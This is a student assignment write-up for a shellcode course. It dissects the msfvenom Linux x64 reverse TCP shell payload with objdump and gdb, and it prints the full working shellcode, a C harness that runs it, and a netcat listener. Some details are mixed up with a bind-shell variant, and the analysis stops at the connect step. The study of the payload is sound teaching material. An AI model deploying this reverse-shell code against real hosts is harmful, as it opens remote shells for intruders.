## Assignment #5.3: Shellcode `linux/x64/shell_reverse_tcp` Dissection
---
---
### Introduction
---
The `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/shell_reverse_tcp` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/shell_reverse_tcp --list-options
Options for payload/linux/x64/shell_reverse_tcp:
=========================

       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x64/shell_reverse_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 74
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell
```

The payload is only 74 bytes and it requires the following parameters:
- `LPORT`: The port to listen for the incoming connection
- `LHOST`: The target to connect back

> NOTE: In the captures of `gdb`, comments are especified with the `<==` symbol. This is added when want to comment what's going on in the debugger. The symbol `==` means that the comment is a continuation from previous line comment. Also, not interesting sections from `gdb` output been replaced by a "**_REMOVED_**" text (this removed sections is code that are not of interest for what will be talking in that step).

### Creating the Shellcode
---
Let's generate the shellcode. Let's leave the default port "4444" and let's set LHOST to "127.0.0.1" (loopback address). Let's generate the payload shellcode:
```c
SLAE64> msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
SLAE64> 
```
The generated payload size, this time did not change in size.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamed to `Payload_03.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_03.c -o Payload_03
```
When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:

<img src="https://galminyana.github.io/img/A053_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:

```asm
SLAE64> objdump -M intel -D Payload_03
**_REMOVED_**
0000000000004060 <code>:
    4060:       6a 29                   push   0x29
    4062:       58                      pop    rax
    4063:       99                      cdq
    4064:       6a 02                   push   0x2
    4066:       5f                      pop    rdi
    4067:       6a 01                   push   0x1
    4069:       5e                      pop    rsi
    406a:       0f 05                   syscall
    406c:       48 97                   xchg   rdi,rax
    406e:       48 b9 02 00 11 5c 7f    movabs rcx,0x100007f5c110002
    4075:       00 00 01 
    4078:       51                      push   rcx
    4079:       48 89 e6                mov    rsi,rsp
    407c:       6a 10                   push   0x10
    407e:       5a                      pop    rdx
    407f:       6a 2a                   push   0x2a
    4081:       58                      pop    rax
    4082:       0f 05                   syscall
    4084:       6a 03                   push   0x3
    4086:       5e                      pop    rsi
    4087:       48 ff ce                dec    rsi
    408a:       6a 21                   push   0x21
    408c:       58                      pop    rax
    408d:       0f 05                   syscall 
    408f:       75 f6                   jne    4087 <code+0x27>
    4091:       6a 3b                   push   0x3b
    4093:       58                      pop    rax
    4094:       99                      cdq    
    4095:       48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
    409c:       73 68 00 
    409f:       53                      push   rbx
    40a0:       48 89 e7                mov    rdi,rsp
    40a3:       52                      push   rdx
    40a4:       57                      push   rdi
    40a5:       48 89 e6                mov    rsi,rsp
    40a8:       0f 05                   syscall
        ...
**_REMOVED_**
SLAE64> 
```
In the disassembled code, can observe the use of 4 syscalls. PEr the values in RAX, those syscalls are:
- `sys_socket`  value "0x29"
- `sys_connect` value "0x2a"
- `sys_dup2`    value "0x21"
- `sys_exec`    value "0x3b"
Also, a two hex values are pushed into the stack, this hex values corresponds to:
- A struct required for the `sys_connect` call, with value **`rcx,0x100007f5c110002`** that stands for IP "127.0.0.1" (`0x0100007f`), the TCP port "4444" (`0x115c`), a NULL and a "2".
- The string `/bin/sh` for **`0x68732f6e69622f`**
```python
>>> "68732f6e69622f".decode('hex')[::-1]
'/bin/sh'
>>> 
```

With this previous data, an idea of what the code does. Let's debug it

### The Fun: GDB Analysis
---
As how the shellcode is disasembled, the code can be divided in sections. This sections are defined by the different syscalls. To simplify the analysis, we going to debug section by section.

Let's load the exec file into `gdb`, setup the environment, place a breakpoint in the code section with `b *&code`, then `run` it and `disassemble`. Then the code for the shellcode is printed on screen:
```asm
root@debian:~/SLAE64/Exam/Assignment05# gdb Payload_03
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from Payload_03...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *&code
Breakpoint 1 at 0x4060
(gdb) run
Starting program: /root/SLAE64/Exam/Assignment05/Payload_03 
ShellCode Lenght: 17

Breakpoint 1, 0x0000555555558060 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	       push   0x29
   0x0000555555558062 <+2>:	       pop    rax
   0x0000555555558063 <+3>:	       cdq    
   0x0000555555558064 <+4>:	       push   0x2
   0x0000555555558066 <+6>:	       pop    rdi
   0x0000555555558067 <+7>:	       push   0x1
   0x0000555555558069 <+9>:	       pop    rsi
   0x000055555555806a <+10>:	syscall 
   0x000055555555806c <+12>:	xchg   rdi,rax
   0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002
   0x0000555555558078 <+24>:	push   rcx
   0x0000555555558079 <+25>:	mov    rsi,rsp
   0x000055555555807c <+28>:	push   0x10
   0x000055555555807e <+30>:	pop    rdx
   0x000055555555807f <+31>:	push   0x2a
   0x0000555555558081 <+33>:	pop    rax
   0x0000555555558082 <+34>:	syscall 
   0x0000555555558084 <+36>:	push   0x3
   0x0000555555558086 <+38>:	pop    rsi
   0x0000555555558087 <+39>:	dec    rsi
   0x000055555555808a <+42>:	push   0x21
   0x000055555555808c <+44>:	pop    rax
   0x000055555555808d <+45>:	syscall 
   0x000055555555808f <+47>:	jne    0x555555558087 <code+39>
   0x0000555555558091 <+49>:	push   0x3b
   0x0000555555558093 <+51>:	pop    rax
   0x0000555555558094 <+52>:	cdq    
   0x0000555555558095 <+53>:	movabs rbx,0x68732f6e69622f
   0x000055555555809f <+63>:	push   rbx
   0x00005555555580a0 <+64>:	mov    rdi,rsp
   0x00005555555580a3 <+67>:	push   rdx
   0x00005555555580a4 <+68>:	push   rdi
   0x00005555555580a5 <+69>:	mov    rsi,rsp
   0x00005555555580a8 <+72>:	syscall 
   0x00005555555580aa <+74>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
Now, to dissect the diferent sections of the code:

#### Section 1: 
As seen in previous Assignments, as this is a TCP/IP connection,`sys_socket` is defined as:
```c
int socket(int domain, int type, int protocol);
```
From this, registers for this syscall need to get the following values:
- RAX gets the syscall number, 0x29
- RDI gets the domain. As it's an IPv4 connection, value has to be 2 (AF_INET)
- RSI gets the type of the connection. As it's a TCP oriented connection, value has to be 0x01 (SOCK_STREAM)
- RDX gets the protocol. As it's an IP connection, value has to be 0x00
To review the value of the registers before the call, let's place a breakpoint just before the `sys_socket` syscall to check register values if match with the values they should have:
```asm
(gdb) b *0x000055555555806a
Breakpoint 2 at 0x55555555806a
(gdb) continue
Continuing.
Breakpoint 2, 0x000055555555806a in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0000555555558060 <+0>:	       push   0x29         <== RAX <- 0x29
   0x0000555555558062 <+2>:	       pop    rax
   0x0000555555558063 <+3>:	       cdq                 <== RDX <- 0
   0x0000555555558064 <+4>:	       push   0x2          <== RDI <- 2
   0x0000555555558066 <+6>: 	pop    rdi
   0x0000555555558067 <+7>:	       push   0x1          <== RSI <- 1
   0x0000555555558069 <+9>:	       pop    rsi
=> 0x000055555555806a <+10>:	syscall             <== `sys_socket`
   0x000055555555806c <+12>:	xchg rdi,rax        <== RDI <- socket descriptor
**_REMOVED_**
End of assembler dump.
(gdb) 
```
Dumping register values at this point, shows that everything is correct:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x29                41
rdi            0x2                 2
rsi            0x1                 1
rdx            0x0                 0
(gdb) 
```
Once the syscall is executed, the socket descriptor returned in RAX is saved into the RDI register for future use. The socket descriptor is "3":
```asm
(gdb) stepi
0x000055555555806c in code ()
(gdb) stepi
0x000055555555806e in code ()
(gdb) disassemble
**_REMOVED_**
   0x000055555555806c <+12>:	xchg   rdi,rax                <== Saves socket descriptor into RDI
=> 0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002
**_REMOVED_**
(gdb) info registers rdi
rdi            0x3                 3
(gdb) 
```
#### Section 2: `sys_connect`
Definition for `sys_connect` from it's man page:
```c
int connect(int  sockfd, const struct sockaddr *serv_addr, socklen_t addrlen); 
```
For the definition of the function, registers will get the following values: 
- RAX : Syscall Number, "0x21"
- RDI : The sock_id from the open() call. From previous section, this value is "3"
- RSI : Addres of the sockaddr struct. 
- RDX : Length of the struct. 

First this done is to create the **sockaddr** struct and push it to the stack and then, update RSI with the pointer to memory for this struct. The struct definition is:
```c
server.sin_family = AF_INET
server.sin_port = htons(PORT)   // 4444
server.sin_addr.s_addr = inet_addr("127.0.0.1")
bzero(&server.sin_zero, 8)
```

The struct is created pushing it's 8 bytes already placed in the right order into the RBX register. Let's `stepi` until the value is placed in the stack and review showing the contents of the stack. Also will ensure that RSI points to the top of the stack where the struct is stored.Everything looks correct:

```asm
(gdb) stepi
0x0000555555558078 in code ()
(gdb) stepi
0x0000555555558079 in code ()
(gdb) stepi
0x000055555555807c in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002     <== Struct contents into RBX
   0x0000555555558078 <+24>:	push   rcx                       <== Struct into the Stack. 
                                                                     ==RSP has the @ of struct
   0x0000555555558079 <+25>:	mov    rsi,rsp                   <== RSI <- @ struct
=> 0x000055555555807c <+28>:	push   0x10
**_REMOVED_**
End of assembler dump.
(gdb) x/8xb $rsp
0x7fffffffe750:	0x02	0x00	0x11	0x5c	0x7f	0x00	0x00	0x01
(gdb) x/8db $rsp
0x7fffffffe750:	2	0	17	92	127	0	0	1
(gdb) info registers rsi
rsi            0x7fffffffe750      140737488349008                  <== Address of RSP. Where struct it
(gdb) 
```
Once the struct is stored and RSI points to it, next steps before the syscall are trivial. RDX needs to get the length of the **sockaddr** struct that's "16" bytes, and RAX gets the syscall number "0x21". Keep in mind, that RDI already stores the socket descriptor. Placing a breakpoint before syscall executes and `continue`, will be able to review if the contents of the registers are the expected ones:
```asm
(gdb) break *0x0000555555558082
Breakpoint 3 at 0x555555558082
(gdb) c
Continuing.
Breakpoint 3, 0x0000555555558082 in code ()
(gdb) disassemble 
**_REMOVED_**
   0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002
   0x0000555555558078 <+24>:	push   rcx
   0x0000555555558079 <+25>:	mov    rsi,rsp
   0x000055555555807c <+28>:	push   0x10
   0x000055555555807e <+30>:	pop    rdx
   0x000055555555807f <+31>:	push   0x2a
   0x0000555555558081 <+33>:	pop    rax
=> 0x0000555555558082 <+34>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax rdi rsi rcx rsp
rax            0x2a                42
rdi            0x3                 3
rsi            0x7fffffffe750      140737488349008
rcx            0x100007f5c110002   72058141043392514
(gdb) x/16xb $rsi
0x7fffffffe750:	0x02	0x00	0x11	0x5c	0x7f	0x00	0x00	0x01
0x7fffffffe758:	0x83	0x51	0x55	0x55	0x55	0x55	0x00	0x00
(gdb) 
```

> At this point, noticed that the **&bzero** parameter for the struct has not been pushed into the stack... Taking note of this and will review later why.

Before doing, let's open a `netcat` listener in another terminal as program will stop until the connect is successfull:
```bash
SLAE64> nc -lvp 4444
listening on [any] 4444 ...

```

As the registers are correct and all seems ok, `stepi` into the syscall and establish the connection.




### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_03.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_03.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/shell_bind_tcp_random_port` shellcode.
- [Shellcode_03.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_03.txt) : The rax shellcode in hex into a text file.

### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
